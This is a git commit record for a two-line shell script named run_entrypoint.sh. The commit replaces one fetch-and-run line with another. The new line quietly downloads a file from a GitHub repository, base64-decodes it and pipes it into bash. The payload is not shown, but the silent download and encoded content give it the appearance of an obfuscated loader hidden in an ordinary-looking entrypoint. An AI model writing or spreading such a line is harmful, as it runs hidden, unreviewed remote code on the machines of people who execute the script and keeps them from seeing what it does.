0bad95a21e6f322a4094251cd129f570d21ef531
coreymercado <coreymercado@proton.me>
2026-06-18 00:08:31 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/andrewspencer2311/ball/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/coreymercado/impact/refs/heads/main/entrypoint.sh | base64 -d | bash
